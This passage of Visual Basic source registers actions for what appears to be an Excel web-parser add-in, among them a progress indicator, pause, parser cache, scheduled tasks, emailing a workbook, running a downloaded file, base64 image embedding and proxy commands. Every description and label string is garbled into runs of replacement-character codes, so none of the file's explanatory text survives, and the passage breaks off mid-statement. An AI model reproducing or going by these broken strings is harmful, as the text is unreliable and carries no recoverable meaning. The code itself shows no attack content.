        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (1 |fffd||fffd||fffd| 2), |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (1, 2 |fffd||fffd||fffd| 3), |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|."

        .AddParameter "Indicator", aps_List, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2"), "1"
        .AddParameter "Line", aps_List, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4", "5", "6", "status"), "1"
        .AddParameter "Message", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| $$index |fffd||fffd| $$count", _
                                                                     "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| $$index |fffd||fffd| $$count:  $value", _
                                                                     "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| $$index |fffd||fffd| $$count:  $value", _
                                                                     "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: {RowsNew}, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: {RowsUpdated}", ""), ""
    End With

    With AAs.AddAction(fc_UNUSED, "ProgressIndicator_SNA", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 0% |fffd||fffd| 100%)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & vbNewLine & _
                       "(|fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, 5, - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 20%)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)."

        .AddParameter "Count", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Multiplier", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3"), "1"
        .AddParameter "Move", aps_List, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd|", Array("-2", "-1", "0", "1", "2", "3"), "0"
    End With

    With AAs.AddAction(fc_UNUSED, "ProgressIndicator_SubAction", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 0% |fffd||fffd| 100%)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|: $value - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, $index - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, $count - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, $time - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."

        .AddParameter "Line1", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| 1-|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count"
        .AddParameter "Line2", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| 2-|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "$value"
        .AddParameter "Line3", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| 3-|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "$time"
    End With


    With AAs.AddAction(fc_ParserOptions, "Pause", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, 0,6 |fffd||fffd||fffd| 2,5"
        .AddParameter "Interval", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", , "1"
    End With

    With AAs.AddAction(fc_ParserOptions, "ParserCache", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd|."
        .AddParameter "Action", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("on", "off", "write", "clear", "open_folder"), "on"
    End With

    With AAs.AddAction(fc_ParserOptions, "AddScheduledTask", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|' |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|), - |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| '|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| " & _
                       "(|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel, |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|). " & _
                       "|fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|/|fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ParserParameter)"

        .AddParameter "TimeValue", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                      Array("00:00:30", "00:15:00", "01:00:00", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| 23:15", "|fffd||fffd||fffd||fffd||fffd||fffd| 02:00", "25 |fffd||fffd||fffd||fffd| |fffd| 12:40", "25.06.2016 12:40"), "01:00:00"
        .AddParameter "TimeMode", aps_List, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                      Array("AfterLastStart", "AfterCurrentTime", "ExactTime"), "AfterLastStart"
        .AddParameter "ParserName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "NeedsWorkbook", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel", Array("|fffd||fffd||fffd|", "|fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|)"), "|fffd||fffd||fffd|"
        .AddParameter "Parameter", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ParserParameter"
        .AddParameter "CancelPreviousTasks", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Another, "SendWorkbook", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Email", aps_Text, "Email"
        .AddParameter "Subject", aps_Text, "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Another, "ExecuteDownload", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Name", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Another, "EmbedImagesIntoHTML", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (base64) |fffd| HTML")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| img, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| src" & vbNewLine & _
                       "(|fffd||fffd||fffd||fffd||fffd||fffd| src=""/images/123.jpg"" |fffd||fffd||fffd||fffd||fffd| src=""data:image;base64,R0lGODlhYgBhA...HA="")"
    End With

    With AAs.AddAction(fc_ParserOptions, "ProxyCommands", "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
